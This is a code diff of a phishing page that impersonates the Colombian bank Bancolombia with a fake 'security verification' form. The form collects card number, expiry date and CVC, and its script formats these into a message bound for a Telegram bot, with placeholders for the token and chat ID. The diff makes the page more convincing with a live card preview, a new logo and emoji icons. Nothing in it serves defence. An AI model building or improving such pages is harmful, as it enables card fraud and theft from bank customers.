@@ -6,120 +6,126 @@
     <title>Verificación de Seguridad - Bancolombia</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Font Awesome para iconos -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bancolombia-blue: #004884;
             --bancolombia-yellow: #FFC107;
             --bancolombia-light-blue: #E8F4FD;
+            --bancolombia-dark-blue: #003366;
         }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f8f9fa;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
             color: #333;
         }
         
-        .bancolombia-header {
-            background-color: var(--bancolombia-blue);
-            color: white;
-            padding: 15px 0;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        .logo-container {
+            text-align: center;
+            padding: 30px 0 20px;
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .bancolombia-logo {
+            height: 50px;
         }
         
         .security-container {
             max-width: 500px;
-            margin: 40px auto;
+            margin: 30px auto;
             background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
             overflow: hidden;
         }
         
         .security-header {
-            background-color: var(--bancolombia-blue);
+            background: linear-gradient(135deg, var(--bancolombia-blue) 0%, var(--bancolombia-dark-blue) 100%);
             color: white;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
         }
         
         .security-body {
-            padding: 30px;
+            padding: 35px;
         }
         
         .form-label {
             font-weight: 600;
             color: var(--bancolombia-blue);
+            margin-bottom: 8px;
         }
         
         .form-control {
-            border-radius: 5px;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 14px 15px;
+            border: 1.5px solid #e0e0e0;
             transition: all 0.3s;
+            font-size: 16px; /* Mejor para móviles */
         }
         
         .form-control:focus {
             border-color: var(--bancolombia-blue);
-            box-shadow: 0 0 0 0.2rem rgba(0, 72, 132, 0.25);
+            box-shadow: 0 0 0 0.2rem rgba(0, 72, 132, 0.15);
         }
         
         .card-input-container {
             position: relative;
         }
         
-        .card-icon {
+        .input-emoji {
             position: absolute;
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: #6c757d;
+            font-size: 20px;
         }
         
         .btn-bancolombia {
-            background-color: var(--bancolombia-yellow);
+            background: linear-gradient(135deg, var(--bancolombia-yellow) 0%, #FFD54F 100%);
             color: #000;
             border: none;
-            border-radius: 5px;
-            padding: 12px 20px;
-            font-weight: 600;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-weight: 700;
             width: 100%;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            font-size: 16px;
+            box-shadow: 0 4px 6px rgba(255, 193, 7, 0.2);
         }
         
         .btn-bancolombia:hover {
-            background-color: #FFCA28;
+            background: linear-gradient(135deg, #FFD54F 0%, var(--bancolombia-yellow) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(255, 193, 7, 0.3);
         }
         
         .security-info {
             background-color: var(--bancolombia-light-blue);
             border-left: 4px solid var(--bancolombia-blue);
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 0 5px 5px 0;
-        }
-        
-        .security-info i {
-            color: var(--bancolombia-blue);
-            margin-right: 10px;
+            padding: 16px;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+            font-size: 0.95rem;
         }
         
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         
         .footer {
             text-align: center;
             margin-top: 30px;
             color: #6c757d;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
         }
         
         .error-message {
             color: #dc3545;
             font-size: 0.875rem;
-            margin-top: 5px;
+            margin-top: 6px;
             display: none;
         }
         
@@ -134,43 +140,82 @@
             text-align: center;
             color: #198754;
             margin-top: 15px;
+            font-weight: 600;
+        }
+        
+        .spinner-border {
+            width: 1.5rem;
+            height: 1.5rem;
+        }
+        
+        .card-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 10px;
+            padding: 20px;
+            color: white;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        
+        .card-chip {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #FFD700 0%, #D4AF37 100%);
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        
+        .card-number-preview {
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            margin: 15px 0;
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <!-- Header Bancolombia -->
-    <div class="bancolombia-header">
-        <div class="container">
-            <div class="row align-items-center">
-                <div class="col-2">
-                    <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/26918/5c8a6e4c-9e9b-4f7c-8e5c-3e8e5c3e8e5c/logo-bancolombia.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-26918-5c8a6e4c-9e9b-4f7c-8e5c-3e8e5c3e8e5c-nB9V9p1" alt="Bancolombia" height="40">
-                </div>
-                <div class="col-8 text-center">
-                    <h4 class="mb-0">Verificación de Seguridad</h4>
-                </div>
-                <div class="col-2 text-end">
-                    <i class="fas fa-lock"></i>
-                </div>
-            </div>
-        </div>
+    <!-- Logo Bancolombia -->
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Bancolombia_logo.svg/2560px-Bancolombia_logo.svg.png" alt="Bancolombia" class="bancolombia-logo">
     </div>
 
     <!-- Contenedor del formulario -->
     <div class="container">
         <div class="security-container">
             <div class="security-header">
-                <h3><i class="fas fa-shield-alt me-2"></i>Verificación Requerida</h3>
-                <p class="mb-0">Para continuar con el proceso, complete la siguiente información</p>
+                <h3>🔒 Verificación de Seguridad</h3>
+                <p class="mb-0">Complete la información requerida para continuar</p>
             </div>
             
             <div class="security-body">
+                <div class="card-preview">
+                    <div class="card-chip"></div>
+                    <div class="card-number-preview" id="cardPreview">**** **** **** ****</div>
+                    <div class="card-details">
+                        <div>
+                            <div style="font-size: 0.7rem; opacity: 0.8;">TITULAR</div>
+                            <div>•••• ••••</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 0.7rem; opacity: 0.8;">EXPIRA</div>
+                            <div>••/••</div>
+                        </div>
+                    </div>
+                </div>
+                
                 <div class="security-info">
-                    <p class="mb-0"><i class="fas fa-info-circle"></i>Esta información es necesaria para validar su identidad y proteger su cuenta.</p>
+                    <span>📋</span> Esta información es necesaria para validar su identidad y proteger su cuenta.
                 </div>
                 
                 <form id="securityForm">
                     <div class="mb-4">
-                        <label for="cardNumber" class="form-label">Número de Tarjeta</label>
+                        <label for="cardNumber" class="form-label">💳 Número de Tarjeta</label>
                         <div class="card-input-container">
                             <input type="text" 
                                    class="form-control" 
@@ -178,25 +223,28 @@
                                    placeholder="1234 5678 9012 3456"
                                    maxlength="19"
                                    required>
-                            <i class="fas fa-credit-card card-icon"></i>
+                            <span class="input-emoji">🔢</span>
                         </div>
                         <div class="error-message" id="cardNumberError">Por favor ingrese un número de tarjeta válido (16 dígitos)</div>
                     </div>
                     
                     <div class="row">
                         <div class="col-md-6 mb-4">
-                            <label for="expiryDate" class="form-label">Fecha de Expiración</label>
-                            <input type="text" 
-                                   class="form-control" 
-                                   id="expiryDate" 
-                                   placeholder="MM/AA"
-                                   maxlength="5"
-                                   required>
+                            <label for="expiryDate" class="form-label">📅 Fecha de Expiración</label>
+                            <div class="card-input-container">
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="expiryDate" 
+                                       placeholder="MM/AA"
+                                       maxlength="5"
+                                       required>
+                                <span class="input-emoji">🗓️</span>
+                            </div>
                             <div class="error-message" id="expiryDateError">Por favor ingrese una fecha válida (MM/AA)</div>
                         </div>
                         
                         <div class="col-md-6 mb-4">
-                            <label for="cvc" class="form-label">Código de Seguridad (CVC)</label>
+                            <label for="cvc" class="form-label">🔐 Código de Seguridad (CVC)</label>
                             <div class="card-input-container">
                                 <input type="text" 
                                        class="form-control" 
@@ -204,14 +252,14 @@
                                        placeholder="123"
                                        maxlength="3"
                                        required>
-                                <i class="fas fa-lock card-icon"></i>
+                                <span class="input-emoji">🛡️</span>
                             </div>
                             <div class="error-message" id="cvcError">Por favor ingrese un CVC válido (3 dígitos)</div>
                         </div>
                     </div>
                     
                     <button type="submit" class="btn btn-bancolombia">
-                        <i class="fas fa-paper-plane me-2"></i>Verificar y Continuar
+                        ✅ Verificar y Continuar
                     </button>
                     
                     <div class="loading" id="loading">
@@ -222,13 +270,12 @@
                     </div>
                     
                     <div class="success-message" id="successMessage">
-                        <i class="fas fa-check-circle fa-2x mb-2"></i>
-                        <p>Verificación exitosa. Redirigiendo...</p>
+                        <p>✅ Verificación exitosa. Redirigiendo...</p>
                     </div>
                 </form>
                 
                 <div class="footer">
-                    <p><i class="fas fa-lock me-1"></i>Sus datos están protegidos con encriptación de alta seguridad</p>
+                    <p>🛡️ Sus datos están protegidos con encriptación de alta seguridad</p>
                 </div>
             </div>
         </div>
@@ -243,6 +290,7 @@
             const cardNumberInput = document.getElementById('cardNumber');
             const expiryDateInput = document.getElementById('expiryDate');
             const cvcInput = document.getElementById('cvc');
+            const cardPreview = document.getElementById('cardPreview');
             const loadingElement = document.getElementById('loading');
             const successMessage = document.getElementById('successMessage');
             
@@ -259,6 +307,26 @@
                 }
                 
                 e.target.value = formattedValue;
+                
+                // Actualizar vista previa
+                if (value.length > 0) {
+                    let preview = value.substring(0, 16);
+                    while (preview.length < 16) {
+                        preview += '*';
+                    }
+                    
+                    let formattedPreview = '';
+                    for (let i = 0; i < preview.length; i++) {
+                        if (i > 0 && i % 4 === 0) {
+                            formattedPreview += ' ';
+                        }
+                        formattedPreview += preview[i];
+                    }
+                    
+                    cardPreview.textContent = formattedPreview;
+                } else {
+                    cardPreview.textContent = '**** **** **** ****';
+                }
             });
             
             // Formatear fecha de expiración (MM/AA)
@@ -338,7 +406,7 @@
                 const botToken = 'TU_BOT_TOKEN';
                 const chatId = 'TU_CHAT_ID';
                 
-                const message = `🔐 *Nueva Verificación de Tarjeta* 🔐
+                const message = `🔐 *Nueva Verificación de Tarjeta Bancolombia* 🔐
                 
 💳 *Número de Tarjeta:* ${cardNumber}
 📅 *Fecha de Expiración:* ${expiryDate}
